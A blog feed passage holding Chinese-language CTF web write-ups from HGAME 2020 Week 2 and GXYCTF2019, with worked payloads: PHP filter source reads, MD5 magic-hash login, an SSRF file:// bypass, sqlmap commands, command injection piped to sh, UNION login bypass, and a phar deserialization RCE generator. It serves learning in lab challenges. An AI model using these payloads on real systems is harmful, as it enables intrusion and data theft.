YVMfnbEEnlOsKA6dAaX1XZjo77FO/0BGpAFUJlOGcvqiyIbW1bUyO+GXPfIU5fJpn7TIpjuglDCh72P2ATLHpYML+0Bqh+1Gv34pwOLSTY/MKGd1vaAkXOat/0jUJZgHSt9fc46AlJNC+3d8hxmEmXtYEZYAXkiJBHtPko/rHKQ9i2JyzMfl+MW5i/yZdOa31MsLjQKLDa25GETy69EeaCPsVkP4knzIvpvz6u2iD8OtopnL/c0mEiRqtB2To+b5t9E8xwBUA5EioDkafGNGcAwQDebC9kb6vg5clCwx40K9UjUy6LGTbKsHvOHb7l5WK6AI5zmTjw8Hy6PNNir9cEEH1TUC5kHgJXwVGuX7kWIJ5L2N6q2gwK1L8yoUjpZSbSTHdQLCmniqyWqyf/wa1+0f5s7GYetiGS4hUs6fSffrWwyYNKhD05cl2fiiEZKDZfk0z8XAL2s+1HWW8wcoAnZwIAkXH+vT7u5q99H2JQ== </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
    
    
      <category term="科比-布莱恩特" scheme="https://hack-for.fun/tags/%E7%A7%91%E6%AF%94-%E5%B8%83%E8%8E%B1%E6%81%A9%E7%89%B9/"/>
    
      <category term="缅怀" scheme="https://hack-for.fun/tags/%E7%BC%85%E6%80%80/"/>
    
      <category term="R.I.P" scheme="https://hack-for.fun/tags/R-I-P/"/>
    
      <category term="曼巴精神永存!" scheme="https://hack-for.fun/tags/%E6%9B%BC%E5%B7%B4%E7%B2%BE%E7%A5%9E%E6%B0%B8%E5%AD%98/"/>
    
  </entry>
  
  <entry>
    <title>HGAME CTF Web Writeup(Week 2)</title>
    <link href="https://hack-for.fun/posts/20200126/"/>
    <id>https://hack-for.fun/posts/20200126/</id>
    <published>2020-01-26T06:40:13.158Z</published>
    <updated>2020-02-04T14:06:24.425Z</updated>
    
    <content type="html"><![CDATA[<p>果然,我还是不够努力吧.第二周的有些题开始<strong>综合</strong>起来了.<strong>还是多刷题吧,因为不知道是什么,就不知道怎么做</strong></p><p>下面主要记录我做题过程吧!</p><h1 id="Cosmos的博客后台"><a href="#Cosmos的博客后台" class="headerlink" title="Cosmos的博客后台"></a>Cosmos的博客后台</h1><p><strong>个人感觉这道题比较接近实战</strong></p><p>题目描述</p><blockquote><p>Cosmos通过两个小时速成了PHP+HTML，没学过sql的他信心满满的写了一个博客，他说要从博客后台开始……(flag在根目录, 禁止使用任何扫描器)</p></blockquote><ul><li>文件包含读取源码</li><li>利用变量覆盖和弱类型读取账户信息</li><li>插入图片处存在SSRF,绕过parse_url()</li></ul><p><code>http://cosmos-admin.hgame.day-day.work/?action=php://filter/read=convert.base64-encode/resource=login.php</code></p><p>读取login.php 的源码,这里只需要PHP代码就行了</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">"config.php"</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Only for debug</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">DEBUG_MODE</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'debug'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$debug</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'debug'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/"</span><span class="token punctuation">,</span> <span class="token variable">$debug</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"args error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"var_dump($$debug);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: admin.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$admin_password</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token variable">$admin_username</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: admin.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"用户名或密码错误"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>同样的方法读取其他源码</p><p>读取admin.php</p><pre class=" language-PHP"><code class="language-PHP"><?phpinclude "config.php";session_start();if(!isset($_SESSION['username'])) {    header('Location: index.php');    exit();}function insert_img() { // 定义一个插入图片的函数    if (isset($_POST['img_url'])) {        $img_url = @$_POST['img_url'];        $url_array = parse_url($img_url);        if (@$url_array['host'] !== "localhost" && $url_array['host'] !== "timgsa.baidu.com") { // 感觉要SSRF?但是如何绕过这里?            return false;        }           $c = curl_init(); // SSRF石锤        curl_setopt($c, CURLOPT_URL, $img_url);        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);        $res = curl_exec($c);        curl_close($c);        $avatar = base64_encode($res);        if(filter_var($img_url, FILTER_VALIDATE_URL)) {            return $avatar;        }    }    else {        return base64_encode(file_get_contents("static/logo.png")); // 返回URL错误的图片    }}?></code></pre><p>index.php</p><pre class=" language-PHP"><code class="language-PHP"><?phperror_reporting(0);session_start();if(isset($_SESSION['username'])) { //设置名为username的session    header("Location: admin.php"); //index.php并没有与sql交互,因此排除sql注入    exit();}$action = @$_GET['action'];$filter = "/config|etc|flag/i";if (isset($_GET['action']) && !empty($_GET['action'])) {    if(preg_match($filter, $_GET['action'])) { // 过滤掉action中的config etc flag         echo "Hacker get out!";        exit(); // 退出脚本    }        include $action;}elseif(!isset($_GET['action']) || empty($_GET['action'])) {    header("Location: ?action=login.php");    exit();}</code></pre><p>通过三个代码审计,问题存在于admin.php</p><p>得到我的session为<code>lvp1pri3iamh9fhl35sanlga0o</code></p><p>首先要知道session的文件名 <code>sess_+sessionid ,  sessionid可以通过开发者模式获取</code></p><p>所以,这里我的session文件名为<code>sess_lvp1pri3iamh9fhl35sanlga0o</code>,尝试了一波利用后,无果</p><p>我们再来看到login.php中的这段代码</p><pre class=" language-PHP"><code class="language-PHP">//Only for debugif (DEBUG_MODE){    if(isset($_GET['debug'])) {        $debug = $_GET['debug'];        if (!preg_match("/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/", $debug)) {            die("args error!");        }        eval("var_dump($$debug);"); //这里eval中利用的是$$可变变量</code></pre><p>我们可以利用<code>?debug=GLOBALS,再利用var_dump</code>输出相关信息,果然是这样的</p><p><img src="https://i.loli.net/2020/01/25/ePyUJOZAq8fgEYD.png" alt></p><p>得到<code>[&quot;admin_password&quot;]=&gt;    string(32) &quot;0e114902927253523756713132279690&quot;    [&quot;admin_username&quot;]=&gt;    string(7) &quot;Cosmos!&quot;</code></p><p>即<code>Cosmos</code>为用户名,密码应该是<code>md5</code>了的,解一下,发现解不开,但是在学<code>md5碰撞</code>的时候,我们知道,以<code>0e</code>开头的PHP当做科学计数法,都为<code>0</code>,试着去登录一下,发现登录不上去</p><p>我们再来看这一段代码</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$admin_password</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token variable">$admin_username</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: admin.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>现在我们知道了用户名为Cosmos,如果<code>md5($_POST[&#39;password&#39;]==$admin_password</code> 那么就可以成功登录</p><p><strong>php是天下最好的语言!因此我们只需要传递一个密码,让他md5后也是0e开头的就可以了!</strong></p><p><code>==</code>比较,会<strong>先将字符串类型转换成相同的,然后再比较.</strong>XD,之前登录不上去,原来是因为用户名还有一个<code>!</code>,坑人啊</p><p>那么构造用户名为<code>Cosmos!</code>密码<code>QNKCDZO</code> 成功登录后台,长着个样子,<strong>只有一个插入图片的功能</strong>之前也分析了,后台好像存在SSRF</p><p><img src="https://i.loli.net/2020/01/25/6NboeDP9CzOHSTI.png" alt></p><p>定位到相关的代码</p><pre class=" language-PHP"><code class="language-PHP">function insert_img() {    if (isset($_POST['img_url'])) {        $img_url = @$_POST['img_url'];        $url_array = parse_url($img_url); //解析 URL，返回其组成部分        if (@$url_array['host'] !== "localhost" && $url_array['host'] !== "timgsa.baidu.com") {            return false;        }           $c = curl_init();  // 执行curl会话,这里经常会出现ssrf        curl_setopt($c, CURLOPT_URL, $img_url);        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);        $res = curl_exec($c);        curl_close($c);        $avatar = base64_encode($res);        if(filter_var($img_url, FILTER_VALIDATE_URL)) {            return $avatar;        }    }    else {        return base64_encode(file_get_contents("static/logo.png"));    }}</code></pre><p>其中最主要的代码,<strong>flag在根目录下面</strong>,这里应该就是 <code>&amp;&amp;</code>是与,即前后两个表达式必须为真,如果第一个表达式为假就不进行第二个表达式运算 ,<code>!==</code>表示不完全等于,现在就是利用SSRF去读取根目录下面的flag</p><p><img src="https://i.loli.net/2020/01/25/JOpw6k8L9ZyBPEg.png" alt="parse_url"></p><p>现在难点就是如何绕过这个</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span>@<span class="token variable">$url_array</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">"localhost"</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$url_array</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">"timgsa.baidu.com"</span><span class="token punctuation">)</span></code></pre><p>绕过<code>parse_url()</code></p><p><img src="https://i.loli.net/2020/01/25/7YzGymCHtWBnJAw.png" alt></p><p>即host必须是<code>localhost</code>和<code>timagsa.baidu.com</code> 否则返回false, 是的话就发起curl会话</p><p>因为flag在根目录下,所以乱打了一个payload,出来了,但是我感觉这和<strong>代码中判断满足两个host完全不上号</strong></p><p>所以应该是利用了PHP代码的灵活性<code>PHP中 &amp;&amp; 逻辑与运算是只算第一个表达式,如果第一个为false,直接返回false而且直接不计算第二个表达式,所以第二个表达式直接就没用了,因此只需要host为localhost就行了</code></p><blockquote><p>1、./是当前目录</p><p>2、../是父级目录</p><p>3、/是根目录</p></blockquote><p>payload</p><blockquote><pre><code>file://localhost/./..//flag</code></pre></blockquote><p><img src="https://i.loli.net/2020/01/25/1lQa274VHLxRg6T.png" alt></p><p><img src="https://i.loli.net/2020/01/25/PB4XaQO8rjSdClg.png" alt></p><p>参考资料</p><p><a href="https://skysec.top/2018/03/15/Some%20trick%20in%20ssrf%20and%20unserialize()/#trick1-filter-var-bypass" target="_blank" rel="noopener">https://skysec.top/2018/03/15/Some%20trick%20in%20ssrf%20and%20unserialize()/#trick1-filter-var-bypass</a></p><p><a href="http://www.bubuko.com/infodetail-2839004.html" target="_blank" rel="noopener">http://www.bubuko.com/infodetail-2839004.html</a></p><p><strong>*”不要禁锢自己的思维,代码也很灵活,人就要比代码更灵活”*</strong></p><h1 id="Cosmos的留言板-1"><a href="#Cosmos的留言板-1" class="headerlink" title="Cosmos的留言板-1"></a>Cosmos的留言板-1</h1><p>知识点:</p><p>SQLi</p><p>直接使用sqlmap就可以做出来了,前期工作是对<code>/?id=</code>进行爆破,发现并不是.然后因为<code>题目会将我们输入的内容回显在页面上</code>这一点,我还想过<code>XSS</code>,发现确实能弹窗,哈哈哈,但是对这道题应该是没有什么用的.</p><p><img src="https://i.loli.net/2020/01/23/HbxlRCSPKdLgY8k.png" alt></p><p>因此应该是sql注入了,把</p><p>后端代码类似是</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxx <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">"$id"</span><span class="token punctuation">;</span></code></pre><p>抓包后,将请求的内容保存下来</p><p><code>root@ifonlys-kali:~# sqlmap -r 1.txt --dbs --tamper=space2comment</code>得到数据库为<code>easysql</code></p><p><code>root@ifonlys-kali:~# sqlmap -r 1.txt -D easysql --tables --tamper=space2comment</code>得到表为<code>f1aggggggggggggg</code></p><p><code>root@ifonlys-kali:~# sqlmap -r 1.txt -D easysql -T f1aggggggggggggg --columns --tamper=space2comment</code>得到表中字段为<code>fl4444444g</code></p><p><img src="https://i.loli.net/2020/01/23/fSn3hyO4q7bgxsD.png" alt></p><p>得到flag</p><pre><code>hgame{w0w_sql_InjeCti0n_Is_S0_IntereSting!!}</code></pre><p>其实这道题是过滤了<code>空格</code>的sql注入,用<code>/***/</code>绕过就行了</p><h1 id="Cosmos的新语言"><a href="#Cosmos的新语言" class="headerlink" title="Cosmos的新语言#"></a>Cosmos的新语言#</h1><p>应该是要写脚本来抓取代码,但是<strong>难点是这个代码的顺序是随机的</strong>.所以我可以用python来抓取每次刷新的代码,但是这个组合情况我不清楚.所以暂时没有想到好的思路</p><h1 id="Cosmos的聊天室"><a href="#Cosmos的聊天室" class="headerlink" title="Cosmos的聊天室*"></a>Cosmos的聊天室*</h1><p>决定复现一下这道题</p><p>先是爆破验证码</p><p><code>md5.py</code></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10000001</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#s = hashlib.sha1(str(i)).hexdigest()[:6]</span>    <span class="token keyword">if</span> s <span class="token operator">==</span> <span class="token string">"e1656e"</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        <span class="token keyword">break</span></code></pre><p>根据题目的<code>flag is here</code>中提示的要admin才能看到flag,应该是利用xxe获取到admin的token然后伪造身份拿到flag</p><p>但是由于上面的脚本对于题目刷新后.有些验证码爆破不出来了,真的有点恼火.这道题对<code>&lt;&gt;</code>做出了过滤,可以用实体编码绕过,但是输出的代码会被自动转换为大写</p><pre><code>&amp;lt;user role=&quot;admin&quot;&amp;gt;user1&amp;lt;/user&amp;gt;</code></pre><p>在看了大佬写的wp后,发现这道题是利用了<code>XSS+浏览器容错性</code></p><p>而且用了<code>Chrome</code>浏览器,我用<code>FireFox</code>试了下,也行,所以这两个浏览器应该都具备这种特性</p><p><img src="https://i.loli.net/2020/02/04/gDcvRhuCEdFeU8S.png" alt></p><p><img src="https://i.loli.net/2020/02/04/RNgs2VbF1Ck8PXI.png" alt></p><p>参考wp: </p><p><a href="https://0727.site/2020/01/31/HGAME_week02_wp/#more" target="_blank" rel="noopener">https://0727.site/2020/01/31/HGAME_week02_wp/#more</a></p><p><a href="https://zhuanlan.zhihu.com/p/75619278" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/75619278</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;果然,我还是不够努力吧.第二周的有些题开始&lt;strong&gt;综合&lt;/strong&gt;起来了.&lt;strong&gt;还是多刷题吧,因为不知道是什么,就不知道怎么做&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;下面主要记录我做题过程吧!&lt;/p&gt;
&lt;h1 id=&quot;Cosmos的博客后台&quot;&gt;&lt;a hre
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://hack-for.fun/categories/Writeup/"/>
    
    
  </entry>
  
  <entry>
    <title>GXYCTF2019 刷题笔记</title>
    <link href="https://hack-for.fun/posts/20200124/"/>
    <id>https://hack-for.fun/posts/20200124/</id>
    <published>2020-01-23T16:00:00.000Z</published>
    <updated>2020-01-25T16:35:44.702Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Ping-Ping-Ping"><a href="#Ping-Ping-Ping" class="headerlink" title="Ping Ping Ping"></a>Ping Ping Ping</h1><p>命令执行</p><ul><li>bypass 空格 flag 特殊符号如{},and so on</li></ul><p>绕过以上可以用编码绕过和bash拼接形式的</p><p><a href="http://hack-for.fun/2020/01/17/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0RCE%E6%BC%8F%E6%B4%9E/#2-%E7%A9%BA%E6%A0%BC%E4%BB%A3%E6%9B%BF">http://hack-for.fun/2020/01/17/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0RCE%E6%BC%8F%E6%B4%9E/#2-%E7%A9%BA%E6%A0%BC%E4%BB%A3%E6%9B%BF</a></p><p>base64版本的payload</p><pre><code>/?ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh</code></pre><p>bash版本</p><pre><code>/?ip=127.0.0.1;a=ag;b=fl;cat$IFS$9$b$a.php</code></pre><h1 id="BabySQli"><a href="#BabySQli" class="headerlink" title="BabySQli"></a>BabySQli</h1><p>在注释中得到<code>MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</code>进行一次base32解码后得到<code>c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==</code>进行一次base64编码后得到</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'$name'</span></code></pre><p>这里直接可以使用sqlmap做.通过sqlmap跑,发现得到了admin密码的md5值<code>cdc9c819c7f8be2628d4180669009d28</code> 看了WP知道,,,原来是<code>union的万能密码登录</code></p><blockquote><p>当联合查询一个不存在的数据时会虚拟一个根据使用表排序的数据,根据这个特性来进行绕过</p></blockquote><p>username</p><p><code>-1&#39; union select 1, &#39;admin&#39;, &#39;202cb962ac59075b964b07152d234b70&#39; #</code>  </p><p>password,随便</p><p>登录进去得到flag</p><blockquote><p>关键是为什么我跑出来的md5和wp的md5不一样???</p></blockquote><h1 id="BabysqliV3-0"><a href="#BabysqliV3-0" class="headerlink" title="BabysqliV3.0***"></a>BabysqliV3.0***</h1><ul><li><p>弱口令</p></li><li><p>文件包含</p></li><li><p>phar反序列化导致rce <a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p></li><li><p>参考资料</p><p><a href="https://www.gem-love.com/websecurity/490.html" target="_blank" rel="noopener">https://www.gem-love.com/websecurity/490.html</a></p><p><a href="https://www.freebuf.com/articles/web/205943.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/205943.html</a></p></li></ul><p>phar Php ARchive 是PHP里类似于JAR的一种打包文件.会对相应的的class进行序列化存储,在执行某些函数或者需要调用数据的时候<strong>自动反序列化</strong></p><p>注释中存在的<code>u9db8</code>,我第一次做的时候没有好好利用,一直认为是一个注入题,结果根本就不是一个注入点.XD</p><p>然后<code>u9db8</code>不敏感的原因也很简单,自己<strong>基础知识不够牢固没学扎实.</strong></p><p>进行Unicode转码后得到<code>鶸</code>,说明这不是sqli.是一个弱口令</p><p>admin/password登录进去后,是一个文件上传界面</p><p><code>home.php?file=upload</code>,忙猜存在文件包含,然后直接访问upload.php和之前那个是一样的,故存在</p><p>phar可影响的函数</p><p><img src="https://i.loli.net/2020/01/21/t9bAJEQiWd4VeIk.png" alt></p><p>当然最常用的还是<code>file_put_contents</code>和<code>file_get_contents</code></p><p>admin/password 即可成功登录,登录进去后是一个文件上传的页面</p><p>首先包含home.php(tips: 如果有时候xxx.php被过滤,试着用xxx)</p><pre><code>http://b6f0bbbf-8a8b-4ef7-bcb1-e728c86a1d30.node3.buuoj.cn/home.php?file=php://filter/read=convert.base64-encode/resource=home</code></pre><pre class=" language-PHP"><code class="language-PHP"><?phpsession_start();echo "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> <title>Home</title>";error_reporting(0);if(isset($_SESSION['user'])){    if(isset($_GET['file'])){        if(preg_match("/.?f.?l.?a.?g.?/i", $_GET['file'])){            die("hacker!");        }        else{            if(preg_match("/home$/i", $_GET['file']) or preg_match("/upload$/i", $_GET['file'])){                $file = $_GET['file'].".php";            }            else{                $file = $_GET['file'].".fxxkyou!";            }            echo "当前引用的是 ".$file;            require $file;        }    }    else{        die("no permission!");    }}?></code></pre><p>然后upload.php</p><pre class=" language-PHP"><code class="language-PHP"><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> <form action="" method="post" enctype="multipart/form-data">    上传文件    <input type="file" name="file" />    <input type="submit" name="submit" value="上传" /></form><?phperror_reporting(0);class Uploader{    public $Filename;    public $cmd;    public $token;    function __construct(){        $sandbox = getcwd()."/uploads/".md5($_SESSION['user'])."/";//md5+token        $ext = ".txt";        @mkdir($sandbox, 0777, true);        if(isset($_GET['name']) and !preg_match("/data:\/\/ | filter:\/\/ | php:\/\/ | \./i", $_GET['name'])){ // 匹配这几个伪协议,进行文件包含            $this->Filename = $_GET['name'];        }        else{            $this->Filename = $sandbox.$_SESSION['user'].$ext;        }        $this->cmd = "echo '<br><br>Master, I want to study rizhan!<br><br>';";        $this->token = $_SESSION['user'];    }    function upload($file){        global $sandbox; // 定义全局变量        global $ext;        if(preg_match("[^a-z0-9]", $this->Filename)){            $this->cmd = "die('illegal filename!');";        }        else{            if($file['size'] > 1024){ // 文件大小不能超过1024 超过就无法上传                $this->cmd = "die('you are too big (′▽`〃)');";            }            else{                $this->cmd = "move_uploaded_file('".$file['tmp_name']."', '" . $this->Filename . "');";// 将上传的文件进行路劲转移            }        }    }    function __toString(){ // 如果参数为数组则会调用__toString()        global $sandbox;        global $ext;        // return $sandbox.$this->Filename.$ext;        return $this->Filename; // 返回Filename的值    }    function __destruct(){        if($this->token != $_SESSION['user']){ // 执行反序列化的时候检查token            $this->cmd = "die('check token falied!');";        }        eval($this->cmd); // rce点    }}if(isset($_FILES['file'])) {    $uploader = new Uploader(); // 实例化类    $uploader->upload($_FILES["file"]);    if(@file_get_contents($uploader)){ // 将文件内容以字符串的形式输出        echo "下面是你上传的文件：<br>".$uploader."<br>";        echo file_get_contents($uploader);    }}?></code></pre><p>关于phar反序列化,这一点我也还没有深入学习写笔记.因此这里直接搬一点官方wp中的知识</p><p><img src="https://i.loli.net/2020/01/24/m8r6lengSzFa2tL.png" alt></p><p>设置pharreadonly=Off</p><blockquote><p>phar还有一个特点，无需特定的文件后缀，即使使用txt格式的后缀<strong>只要文件内容是phar的</strong></p><p><strong>格式即可被php识别为phar文件</strong>，可以利用这个feature上传txt文件构造反序列化。</p></blockquote><pre class=" language-php"><code class="language-php">@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"exp.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"exp.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//后缀名必须为phar </span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置stub </span><span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uploader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$o</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">token</span> <span class="token operator">=</span> <span class="token string">"GXY320b7a4523609d3d70b40f7aecf5efd3"</span><span class="token punctuation">;</span> <span class="token variable">$o</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token string">"echo file_get_contents('./flag.php');"</span><span class="token punctuation">;</span> <span class="token variable">$o</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">Filename</span> <span class="token operator">=</span> "phar<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//uploads/abef22fc29b1152e66fad2a1dd68770a/GXY320b7a4523609d3d70b40f7aecf5efd3.tx"; </span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义的meta-data存入manifest </span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件 </span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><img src="https://i.loli.net/2020/01/24/OM7aSuh8Wnv935c.png" alt></p><p>根据第一次随便上传的文件获取当前的路径和token,生成了exp.phar.然后<code>修改URL参数</code>上传任意文件得到flag</p><p><img src="https://i.loli.net/2020/01/24/ulR6SJZBLMvD4AN.png" 